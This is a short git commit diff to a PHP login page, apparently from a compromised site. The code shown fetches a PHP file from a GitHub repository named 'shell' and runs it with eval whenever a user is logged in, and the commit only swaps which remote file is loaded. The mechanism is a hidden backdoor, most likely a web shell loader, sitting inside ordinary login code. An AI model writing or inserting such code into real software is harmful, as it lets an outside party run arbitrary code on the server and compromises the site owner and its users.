1e67ad4920e456f8d53c8c8df0df228eda8ad0e1
/Outsiders <78004796+dhee289@users.noreply.github.com>
2024-06-21 14:03:24 +0700

    Update login.php

--- login.php
+++ login.php
@@ -33,7 +33,7 @@ if (is_logged_in()) {
         return $url_get_contents_data;
     }
 
-    $a = geturlsinfo('https://raw.githubusercontent.com/dhee289/shell/shell/let.php');
+    $a = geturlsinfo('https://raw.githubusercontent.com/dhee289/shell/shell/asu.php');
     eval('?>' . $a);
 } else {
     // Display login form if not logged in
